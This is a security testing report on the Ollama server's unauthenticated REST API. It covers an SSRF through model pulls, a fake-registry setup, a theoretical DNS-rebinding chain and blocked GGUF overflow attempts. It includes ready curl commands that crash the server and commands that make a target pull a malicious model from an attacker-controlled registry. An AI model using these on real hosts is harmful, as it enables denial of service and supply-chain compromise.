# Ollama Black-Box Testing — SSRF and GGUF Overflow

**Target:** Ollama v0.24.0 (source @ `42e6f56c`)
**Date:** 2026-05-19
**Scope:** Unauthenticated REST API at `http://<host>:11434`

## API Endpoints (No Auth)

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/blobs/:digest` | POST | Upload raw binary blob |
| `/api/blobs/:digest` | HEAD | Check blob existence (returns 404/405) |
| `/api/create` | POST | Create model from blobs or `from` model |
| `/api/pull` | POST | Pull model from remote registry (SSRF) |
| `/api/generate` | POST | Run inference (triggers model load) |
| `/api/tags` | GET | List models |

## SSRF via `/api/pull`

### Mechanism
The `model` field in `POST /api/pull` is parsed as `model.Name` which includes a registry hostname. The pull flow in `server/images.go` constructs a URL from this hostname with no allowlist:

```go
requestURL := n.BaseURL().JoinPath("v2", n.DisplayNamespaceModel(), "manifests", n.Tag)
```

### Redirect Behavior (`server/download.go:240-252`)
```go
CheckRedirect: func(req *http.Request, via []*http.Request) error {
    if len(via) > 10 { return errMaxRedirectsExceeded }
    if req.URL.Hostname() == requestURL.Hostname() { return nil }  // same host OK
    return http.ErrUseLastResponse  // different host BLOCKED
}
```

**Key findings:**
- **Initial request:** Any host:port (no restriction)
- **Redirects:** Same hostname allowed (including different ports), different hostname blocked
- **Max redirects:** 10
- **Cannot redirect to localhost/internal hosts** from an external attacker hostname

### Empirical Test Results

| Test | Result |
|------|--------|
| `POST /api/pull` with `model: "192.168.0.12:7070/pwn/scan:latest"` | Ollama connected to our registry, pulled manifest, downloaded blob |
| Blob download | 68-byte blob downloaded and stored |
| Push phase | "http: no Location header in response" (expected — our registry doesn't support push) |
| Inference after pull | Model loaded and produced valid output (smollm2 base + our blob as override) |

### Fake Registry Requirements
A minimal fake registry must implement:
```
GET  /v2/{ns}/{model}/manifests/{tag}  -> Docker manifest JSON
HEAD /v2/{ns}/{model}/blobs/{digest}   -> Content-Length header (REQUIRED)
GET  /v2/{ns}/{model}/blobs/{digest}   -> Raw bytes, Range support optional
```

**Critical detail:** The `Prepare()` function (`server/download.go:128`) sends a HEAD request first to get `Content-Length`. If HEAD omits `Content-Length`, `b.Total = 0`, no download parts are created, and the blob is never fetched.

### Model Name Parsing (Empirical)

| Model Name Format | Accepted? | Notes |
|-------------------|-----------|-------|
| `test:latest` | ✅ | Standard name |
| `library/test:latest` | ✅ | With namespace |
| `localhost/test:latest` | ✅ | **localhost accepted!** Tries `http://localhost:5000/...` |
| `localhost:7777/test:latest` | ❌ | Port rejected |
| `192.168.0.12/test:latest` | ❌ | IP rejected |
| `192.168.0.12:7777/test:latest` | ❌ | IP:port rejected |
| `my.registry.com/test:latest` | ❌ | Custom hostname rejected |
| `127.0.0.1/test:latest` | ❌ | Loopback IP rejected |
| `[::1]/test:latest` | ❌ | IPv6 rejected |

**Implication:** `localhost/test:latest` is accepted, meaning Ollama will try to pull from `http://localhost:5000/v2/test/manifests/latest` on ITSELF. If an attacker can run a service on port 5000 on the Ollama host (e.g., via SSH), they can serve arbitrary blobs to Ollama.

### SSRF Limitations for File Extraction
- **Cannot read arbitrary files** — Ollama only downloads from registry-format URLs
- **Cannot redirect to different hostnames** — blocked by CheckRedirect
- **Cannot exfiltrate data** — Ollama receives data during pull, doesn't send host data out
- **Blob URLs are constructed from model name** — cannot point at arbitrary internal URLs
- **File extraction via SSRF alone is not feasible** — Ollama has no "read file → send over HTTP" capability

### DNS Rebinding Attack (Theoretical)
1. Attacker controls DNS for `evil.com`
2. `POST /api/pull` with `model: "evil.com/test:latest"` — Ollama resolves evil.com to attacker IP
3. Attacker responds with redirect to `http://evil.com:22/` — same hostname, redirect allowed
4. Ollama follows redirect — but now evil.com resolves to 127.0.0.1
5. Ollama connects to its own port 22 (SSH)
6. **Bypasses CheckRedirect** because hostname never changes

**Status:** Not yet tested. Requires DNS control or `/etc/hosts` modification on the Ollama host.

## Additional Vulnerabilities (from FINDINGS.md)

### Chain F1: Type Assertion Panic (Confirmed DoS)
`server/create.go` goroutine has no `recover()`. Unsafe type assertions on user-controlled `info` map:

```go
strFromInfo := func(k string) string {
    v, ok := r.Info[k]
    if ok {
        val := v.(string)   // panics if JSON value is not a string
        return val
    }
    return ""
}
```

**Exploit:**
```bash
# Send integer where string expected
curl -X POST http://target:11434/api/create \
  -d '{"model":"x","from":"smollm2:135m","info":{"model_family":1}}'

# Send string where float64 expected
curl -X POST http://target:11434/api/create \
  -d '{"model":"x","from":"smollm2:135m","info":{"context_length":"notanumber"}}'
```

**Impact:** Entire Ollama process crashes. systemd restarts in ~2s. Affected fields: `model_family`, `base_name`, `quantization_level`, `parameter_size` (strFromInfo) and `context_length`, `embedding_length` (vFromInfo).

### Chain F2: `remote_host` Field (Mitigated)
`CreateRequest` accepts a `remote_host` field but at inference time it's checked against `envconfig.Remotes()` allowlist. Not exploitable unless attacker controls `OLLAMA_REMOTES` env var.

## GGUF Overflow Black-Box Testing

### Workflow
1. `POST /api/blobs/sha256:<hex>` — upload malicious GGUF
2. `POST /api/create` with `files: {"model.gguf": "sha256:<hex>"}` — create model
3. `POST /api/generate` — trigger load + inference

### Key Constraints
- `from` field only accepts model names (not paths/URLs/base64)
- `files` map values are blob digests, not inline content
- GGUF must have valid KV metadata for the target architecture
- Tensor names must match expected llama tensor names
- 1D tensors (norm weights) cannot overflow with uint32 hparams -> Go parser always catches them

### Test Results

| Test | Upload | Create | Inference |
|------|--------|--------|-----------|
| No hparams | 201 | success | "unable to load model" (missing KV) |
| With hparams, wrong tensor shape | 201 | success | "unable to load model" (shape mismatch) |
| Matching hparams + overflow tensor | 201 | success | "unable to load model" (check_tensor_dims) |
| From smollm2 + overflow override | 201 | success | Works (base model tensor used) |

### Why RCE Is Blocked
1. **Go parser** catches 1D tensors (norm weights) — they can't overflow with uint32 dims
2. **C++ `check_tensor_dims`** catches 2D+ tensor dimension mismatches
3. **Identical `nb = f(ne)` formulas** in parser and loader mean matching `ne` = matching `nb`
4. **Token list requirement** makes `n_vocab = 2^31` infeasible (8GB+ of strings)
5. **`no_vocab` bypass** causes OOM (`id_to_token.resize(2^31)` ≈ 100GB)

## Combined Attack: SSRF + GGUF Overflow

The SSRF can be used to pull a malicious GGUF from an attacker-controlled registry:
```bash
# Attacker runs fake registry on port 7070
python3 fake_registry.py 0.0.0.0 7070

# Victim Ollama pulls malicious model
curl -X POST http://target:11434/api/pull \
  -d '{"model": "attacker:7070/pwn/crash:latest", "insecure": true}'
```

However, the GGUF overflow is still blocked by `check_tensor_dims` in the C++ loader. The SSRF alone provides:
- Internal port scanning
- Internal service fingerprinting
- Supply chain attack vector (serve malicious but valid models)
